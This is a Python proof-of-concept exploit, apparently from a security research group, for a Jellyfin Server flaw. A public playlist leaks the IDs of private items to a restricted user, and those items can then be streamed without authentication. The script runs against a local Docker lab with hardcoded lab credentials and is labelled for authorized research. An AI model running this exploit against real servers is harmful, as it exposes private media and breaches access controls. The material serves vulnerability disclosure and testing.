#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: jellyfin-playlist-itemids (High: 6.5)
#  Vendor: Jellyfin Server (Jellyfin)
#  Versions: Jellyfin Server 12.2 (ca0f16eb)
#  Impact: public playlist ItemIds leak private GUIDs then unauth stream plays them
#  Requires: Docker, jellyfin/jellyfin:12.2, loopback 127.0.0.1:18800
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "jellyfin-playlist-itemids"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: public playlist ItemIds leak plus unauth video stream."""

import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any

LABEL = "JELLYFIN-PLAYLIST-ITEMIDS"
WITNESS = "JELLYFIN-PLAYLIST-ITEMIDS-WITNESS"
BASE = os.environ.get("JELLYFIN_URL", "http://127.0.0.1:18800").rstrip("/")
ADMIN_USER = "labadmin"
ADMIN_PASS = "LabAdmin1!"
LAB_USER = "labuser"
LAB_PASS = "LabUser1!"
CLIENT = "lab"
DEVICE = "lab"
DEVICE_ID_ADMIN = "lab-playlist"
DEVICE_ID_USER = "lab-playlist-b"
VERSION = "12.2.0"
PRIVATE_FOLDER = "PrivateA"
PUBLIC_FOLDER = "PublicB"
PLAYLIST_NAME = WITNESS
READY_TIMEOUT = int(os.environ.get("JELLYFIN_READY_TIMEOUT", "180"))
ITEM_TIMEOUT = int(os.environ.get("JELLYFIN_ITEM_TIMEOUT", "180"))


@dataclass
class HttpResult:
    status: int
    body: bytes
    headers: dict[str, str]

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", "replace")

    @property
    def json(self) -> Any:
        text = self.text.strip()
        if not text:
            return None
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            return None


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def sanitize(text: str) -> str:
    return text.replace("\n", " ").replace("\r", " ")[:240]


def as_dict(value: Any) -> dict[str, Any]:
    return value if isinstance(value, dict) else {}


def as_list(value: Any) -> list[Any]:
    return value if isinstance(value, list) else []


def guid_norm(value: Any) -> str:
    return str(value or "").replace("-", "").replace("{", "").replace("}", "").lower()


def auth_header(device_id: str, token: str | None = None) -> str:
    parts = [
        f'Client="{CLIENT}"',
        f'Device="{DEVICE}"',
        f'DeviceId="{device_id}"',
        f'Version="{VERSION}"',
    ]
    if token:
        parts.append(f'Token="{token}"')
    return "MediaBrowser " + ", ".join(parts)


def http(
    method: str,
    path: str,
    *,
    token: str | None = None,
    device_id: str = DEVICE_ID_ADMIN,
    payload: dict[str, Any] | None = None,
    query: dict[str, str] | None = None,
    send_auth: bool = True,
    timeout: int = 60,
    max_body: int = 2_000_000,
) -> HttpResult:
    url = path if path.startswith("http") else f"{BASE}{path}"
    if query:
        url = f"{url}?{urllib.parse.urlencode(query)}"
    headers = {"Accept": "application/json"}
    data: bytes | None = None
    if send_auth:
        headers["Authorization"] = auth_header(device_id, token)
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    elif method in {"POST", "PUT"}:
        data = b""
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(max_body)
            hdrs = {k.lower(): v for k, v in resp.headers.items()}
            return HttpResult(int(resp.status), body, hdrs)
    except urllib.error.HTTPError as exc:
        body = exc.read(max_body)
        hdrs = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
        return HttpResult(int(exc.code), body, hdrs)
    except Exception as exc:
        return HttpResult(0, sanitize(str(exc)).encode("utf-8"), {})


def expect(result: HttpResult, allowed: set[int], what: str) -> HttpResult:
    if result.status not in allowed:
        fail(f"{what} http={result.status} body={sanitize(result.text)}")
    log(f"IOC {what} http={result.status} body={sanitize(result.text)}")
    return result


def login(username: str, password: str, device_id: str) -> tuple[str, dict[str, Any]]:
    result = http(
        "POST",
        "/Users/AuthenticateByName",
        device_id=device_id,
        payload={"Username": username, "Pw": password},
    )
    expect(result, {200}, f"login-{username}")
    data = as_dict(result.json)
    token = str(data.get("AccessToken") or "")
    user = as_dict(data.get("User"))
    if not token or not user.get("Id"):
        fail(f"login-{username} missing token/id body={sanitize(result.text)}")
    return token, user


def folder_id(folders: list[Any], name: str) -> str:
    for folder in folders:
        info = as_dict(folder)
        if str(info.get("Name") or "") == name:
            item_id = str(info.get("ItemId") or "")
            if item_id:
                return item_id
    fail(f"virtual-folder-missing name={name}")
    raise AssertionError


def item_matches(item: dict[str, Any], needle: str) -> bool:
    blob = " ".join(
        str(item.get(key) or "")
        for key in ("Name", "Path", "OriginalTitle", "SortName", "Overview")
    )
    return needle in blob or needle in json.dumps(item)


def collect_ids(value: Any) -> list[str]:
    found: list[str] = []
    if isinstance(value, dict):
        for key, child in value.items():
            if key.lower() in {"id", "itemid"} and child:
                found.append(str(child))
            else:
                found.extend(collect_ids(child))
    elif isinstance(value, list):
        for child in value:
            found.extend(collect_ids(child))
    return found


def wait_library_item(token: str, user_id: str, needle: str) -> dict[str, Any]:
    deadline = time.time() + ITEM_TIMEOUT
    n = 0
    last_status = 0
    last_count = 0
    while time.time() < deadline:
        n += 1
        if n in {1, 8, 16}:
            refresh = http("POST", "/Library/Refresh", token=token, timeout=180)
            log(f"IOC library-refresh n={n} http={refresh.status}")
        result = http(
            "GET",
            "/Items",
            token=token,
            query={
                "userId": user_id,
                "recursive": "true",
                "includeItemTypes": "Movie,Video",
                "fields": "Path,Name",
                "enableImages": "false",
            },
        )
        last_status = result.status
        data = as_dict(result.json)
        items = as_list(data.get("Items"))
        last_count = len(items)
        for item in items:
            parsed = as_dict(item)
            if item_matches(parsed, needle) and parsed.get("Id"):
                log(
                    f"IOC private-item n={n} id={parsed.get('Id')} "
                    f"name={parsed.get('Name')} path={parsed.get('Path')}"
                )
                return parsed
        log(f"IOC private-item-wait n={n} http={last_status} items={last_count}")
        time.sleep(3)
    fail(f"private-item-timeout http={last_status} items={last_count}")
    raise AssertionError


def wizard() -> None:
    user_get = http("GET", "/Startup/User")
    expect(user_get, {200}, "startup-user-get")
    user_post = http(
        "POST",
        "/Startup/User",
        payload={"Name": ADMIN_USER, "Password": ADMIN_PASS},
    )
    expect(user_post, {204, 200}, "startup-user-post")
    remote = http("POST", "/Startup/RemoteAccess", payload={"EnableRemoteAccess": True})
    expect(remote, {204, 200}, "startup-remote-access")

    library_options: dict[str, Any] = {
        "LibraryOptions": {
            "EnableRealtimeMonitor": False,
            "EnableInternetProviders": False,
            "SaveLocalMetadata": False,
            "PathInfos": [],
            "TypeOptions": [
                {
                    "Type": "Movie",
                    "MetadataFetchers": [],
                    "ImageFetchers": [],
                },
                {
                    "Type": "Video",
                    "MetadataFetchers": [],
                    "ImageFetchers": [],
                },
            ],
        }
    }
    for name, path in ((PRIVATE_FOLDER, "/media/private-a"), (PUBLIC_FOLDER, "/media/public-b")):
        add = http(
            "POST",
            "/Library/VirtualFolders",
            payload=library_options,
            query={
                "name": name,
                "collectionType": "movies",
                "paths": path,
                "refreshLibrary": "true",
            },
            timeout=120,
        )
        expect(add, {204, 200}, f"virtual-folder-{name}")

    complete = http("POST", "/Startup/Complete")
    expect(complete, {204, 200}, "startup-complete")


def restrict_user(admin_token: str, user_id: str, public_id: str) -> None:
    fetched = http("GET", f"/Users/{user_id}", token=admin_token)
    expect(fetched, {200}, "user-get")
    policy = dict(as_dict(as_dict(fetched.json).get("Policy")))
    if not policy:
        fail("user-policy-empty")
    policy["EnableAllFolders"] = False
    policy["EnabledFolders"] = [public_id]
    # IsVisible on a Movie is parental/tags only, not EnabledFolders. AllowedTags
    # makes GHSA-9x85's Items filter drop the private child; playlist OpenAccess
    # still sees it because HasParentalAllowedChild skips the allowed-tag check.
    policy["AllowedTags"] = ["lab-public"]
    updated = http("POST", f"/Users/{user_id}/Policy", token=admin_token, payload=policy)
    expect(updated, {204, 200}, "user-policy")


def create_playlist(admin_token: str, item_id: str) -> str:
    result = http(
        "POST",
        "/Playlists",
        token=admin_token,
        payload={
            "Name": PLAYLIST_NAME,
            "Ids": [item_id],
            "IsPublic": True,
        },
    )
    expect(result, {200}, "playlist-create")
    data = as_dict(result.json)
    playlist_id = str(data.get("Id") or data.get("id") or "")
    if not playlist_id:
        fail(f"playlist-id-missing body={sanitize(result.text)}")
    return playlist_id


def playlist_ids(value: Any) -> list[str]:
    data = as_dict(value)
    raw = data.get("ItemIds")
    if raw is None:
        raw = data.get("itemIds")
    if isinstance(raw, list):
        return [str(x) for x in raw]
    return collect_ids(data)


def unauth_stream(item_id: str) -> HttpResult:
    queries = (
        {"static": "true"},
        {},
    )
    last = HttpResult(0, b"", {})
    for query in queries:
        path = f"/Videos/{item_id}/stream"
        result = http(
            "GET",
            path,
            send_auth=False,
            query=query or None,
            timeout=90,
        )
        label = "static=true" if query else "nostatic"
        log(
            f"IOC unauth-stream {label} http={result.status} "
            f"len={len(result.body)} witness-in-body="
            f"{int(WITNESS.encode('ascii') in result.body)}"
        )
        last = result
        if result.status == 200 and result.body:
            return result
    return last


def main() -> int:
    wizard()
    admin_token, admin = login(ADMIN_USER, ADMIN_PASS, DEVICE_ID_ADMIN)
    admin_id = str(admin["Id"])

    created = http(
        "POST",
        "/Users/New",
        token=admin_token,
        payload={"Name": LAB_USER, "Password": LAB_PASS},
    )
    expect(created, {200}, "users-new")
    lab_user = as_dict(created.json)
    lab_user_id = str(lab_user.get("Id") or "")
    if not lab_user_id:
        fail("users-new missing id")

    folders = http("GET", "/Library/VirtualFolders", token=admin_token)
    expect(folders, {200}, "virtual-folders")
    public_id = folder_id(as_list(folders.json), PUBLIC_FOLDER)
    private_folder_id = folder_id(as_list(folders.json), PRIVATE_FOLDER)
    log(f"IOC folders private={private_folder_id} public={public_id}")
    restrict_user(admin_token, lab_user_id, public_id)

    private_item = wait_library_item(admin_token, admin_id, WITNESS)
    private_id = str(private_item["Id"])

    playlist_id = create_playlist(admin_token, private_id)
    time.sleep(1)
    admin_playlist = http("GET", f"/Playlists/{playlist_id}", token=admin_token)
    expect(admin_playlist, {200}, "playlist-get-admin")
    open_access = bool(as_dict(admin_playlist.json).get("OpenAccess"))
    log(f"IOC playlist id={playlist_id} openAccess={int(open_access)}")
    if not open_access:
        fail("playlist-not-openaccess")

    user_token, _ = login(LAB_USER, LAB_PASS, DEVICE_ID_USER)
    items = http(
        "GET",
        f"/Playlists/{playlist_id}/Items",
        token=user_token,
        device_id=DEVICE_ID_USER,
        query={"userId": lab_user_id},
    )
    expect(items, {200}, "playlist-items-b")
    items_ids = {guid_norm(x) for x in collect_ids(items.json)}
    items_filtered = guid_norm(private_id) not in items_ids
    log(
        f"IOC playlist-items-b count={len(as_list(as_dict(items.json).get('Items')))} "
        f"has-private={int(not items_filtered)}"
    )

    leaked = http(
        "GET",
        f"/Playlists/{playlist_id}",
        token=user_token,
        device_id=DEVICE_ID_USER,
    )
    expect(leaked, {200}, "playlist-get-b")
    leaked_ids = [guid_norm(x) for x in playlist_ids(leaked.json)]
    itemids_leak = guid_norm(private_id) in leaked_ids
    leak_json_has_witness = WITNESS in leaked.text or WITNESS in PLAYLIST_NAME
    log(
        f"IOC playlist-get-b itemIds={leaked_ids} leak={int(itemids_leak)} "
        f"openAccess={as_dict(leaked.json).get('OpenAccess')}"
    )

    b_library = http(
        "GET",
        "/Items",
        token=user_token,
        device_id=DEVICE_ID_USER,
        query={
            "userId": lab_user_id,
            "recursive": "true",
            "includeItemTypes": "Movie,Video",
            "fields": "Path,Name",
            "enableImages": "false",
        },
    )
    b_ids = {guid_norm(x) for x in collect_ids(b_library.json)}
    log(
        f"IOC user-b-library http={b_library.status} "
        f"has-private={int(guid_norm(private_id) in b_ids)}"
    )

    stream = unauth_stream(private_id)
    stream_ok = stream.status == 200 and len(stream.body) > 0
    witness_in_stream = WITNESS.encode("ascii") in stream.body

    if not items_filtered:
        fail(
            f"items-not-filtered playlist-items still listed private={private_id} "
            f"ids={sorted(items_ids)}"
        )
    if not itemids_leak:
        fail(f"itemids-no-leak private={private_id} itemIds={leaked_ids}")
    if not stream_ok:
        fail(f"unauth-stream http={stream.status} len={len(stream.body)}")

    success(
        "items-filtered=yes itemids-leak=yes "
        f"unauth-stream={stream.status} openAccess=yes "
        f"playlist={playlist_id} private={private_id} "
        f"witness-in-stream={'yes' if witness_in_stream else 'no'} "
        f"witness-in-playlist-json={'yes' if leak_json_has_witness else 'no'}"
    )
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"exception {type(exc).__name__}: {exc}")

